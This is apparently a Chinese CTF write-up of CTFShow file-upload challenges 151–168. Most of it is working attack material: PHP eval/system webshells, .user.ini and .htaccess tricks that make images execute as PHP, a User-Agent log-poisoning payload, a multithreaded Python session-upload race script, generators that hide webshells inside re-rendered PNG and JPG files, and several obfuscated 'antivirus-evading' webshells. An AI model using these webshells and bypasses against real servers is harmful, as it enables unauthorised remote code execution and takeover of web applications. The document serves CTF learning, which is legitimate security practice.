---
title: CTFShow文件上传
tags:
  - CTF
  - web
abbrlink: 2824
date: 2022-03-30 15:02:42
---

# 文件上传













**151**

前端校验，直接绕过

**152**

Content/Type校验，直接绕过

**153**

文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 头发现中间件是nginx

```
nginx中和apache的.htacess有相同作用的文件是.user.ini，进一步拓展，php中的默认配置文件实为php.ini，而php.ini有四种配置模式

PHP_INI_USER			可以在user.ini中设定
PHP_INI_PERDIR		可以在php.ini,.htacess,httpd.conf中设定
PHP_INI_SYSTEM		可以在php.ini,httpd.conf中设定
PHP_INI_ALL				随意设定

并且除了php.ini文件之外，php还会从当前目录到web根目录下逐级搜索ini文件，并且在世纪操作中除了PHP_INI_SYSTEM中的内容都可以通过.user.ini进行设定

那么user.ini中实际有用的配置项有两个：
auto_append_file 	//在php4.2.3及以前是PHP_INI_ALL里面的，后面变成了PHP_INI_PERDID
auto_prepend_file
这两项的功能是制定一个文件包含在要执行的文件之后/之前，类似帮助原始文件添加一个require(某文件)
```

所以最终我们需要的就是将木马上传后再上传.user.ini设置包含木马即可

```
//.user.ini
auto_prepend_file = shell.png
//shell.png
@eval($_POST['kkk']);
```

**154**

同上题，过滤了php，大小写绕过

**155**

严格过滤php，所以大小写过不去了，短标签绕过

```PHP
当php参数:short_open_tag = On时，php可以解析短标签内容
php中常见的四种标签的写法：
<?php echo "CTF"; ?>
<? echo "CTF"; ?>		//short_open_tag = On
<% echo "CTF"; %>		//这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。 
<script language="php"> echo "CTF"; </script>

还有一种神奇写法以后会用到
<?=(表达式)?>  等价于 <?php echo (表达式)?> //无限制  
```

**156**

过滤了`[  ]`，可用`{  }`代替

**157**

过滤了分号和花括号，用上面的神奇写法直接执行`<?=(system('tac ../flag.???'))?>` 

**158**

同上

**159**

system貌似没了，用`<?=nl ``../fl*``?>`

**160**

反引号都没了，只能尝试包含访问日志了

```
//shell.png
<?include"/var/lo"."g/nginx/access.lo"."g"?>
//空格都没给留就离谱
//User-Agent
<?php eval($_POST[1]);?>
```

**161**

增加了对文件头的检测，其余同上

**162**

.和flag被过滤，session文件的竞争包含，隔壁文件包含有原因

```php+HTML
//.user.ini
auto_prepend_file=/tmp/sess_kkk
//1
<?=include"/tmp/sess_kkk"?>
//POC.html
<!DOCTYPE html>
<html>
<body>
<form action="链接" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" value="submit" />
</form>
</body>
</html>
```

脚本

```python
import requests
import threading

session = requests.session()
sess = 'j1an'
url1 = "http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/"
url2 = "http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/upload"
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'
}
file = {
    'file': 'j1an'
}
cookies = {
    'PHPSESSID': sess
}


def write():
    while True:
        r = session.post(url1, data=data1, files=file, cookies=cookies)


def read():
    while True:
        r = session.get(url2)
        print(r.text)
        if 'flag' in r.text:
            print(r.text)


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()
```





**163**

同上

**164**

png图片二次渲染

```
在php中包含需要渲染的代码时
```

直接用大佬脚本生成一张图片咯

```PHP
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'kkk.png');  //要修改的图片的路径
/*
木马内容
<?$_GET[0]($_POST[1]);?>
*/
?>
```

**165**

jpg图片二次渲染

```php
<?php
    $miniPayload = "<?php system('tac f*');?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
用法  php exp.php a.png
```

**166**

x-zip-compressed

**167**

提示中为httpd，肯定与apache有关，尝试解析漏洞，上传shell.php.xxx发现执行失败，尝试上传.htaccess

```
<FilesMatch "png">
SetHandler application/x-httpd-php
</FilesMatch>
或者
AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php
```

OK

**168**

构造免杀木马

```
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>
```

```
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>
```

```
<?php
$a=strrev('metsys');
$a($_REQUEST[1]);
?>
```

```
<?php
$a=$_REQUEST['a'];
$b=$_REQUEST['b'];
$a($b);
?>
```









